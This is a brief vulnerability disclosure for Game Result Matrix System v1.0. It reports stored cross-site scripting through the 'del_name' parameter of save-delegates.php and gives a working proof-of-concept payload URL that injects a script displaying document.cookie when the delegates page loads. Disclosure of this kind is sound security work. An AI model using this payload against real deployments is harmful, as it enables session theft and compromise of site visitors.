# Game Result Matrix System v1.0 has stored cross-site scripting

BUG_Author: zhangyf

Website source code address: https://www.sourcecodester.com/php/14022/game-result-matrix.html

Vulnerability File: /dipam/save-delegates.php

GET parameter "del_name" exists stored cross-site scripting vulnerability

Payload: /dipam/save-delegates.php?del_name=<script>alert(document.cookie)</script>&del_color=%23000000

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/5.png)

Payload will trigger when a user visits on http://localhost/dipam/all-delegates.php.

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/6.png)
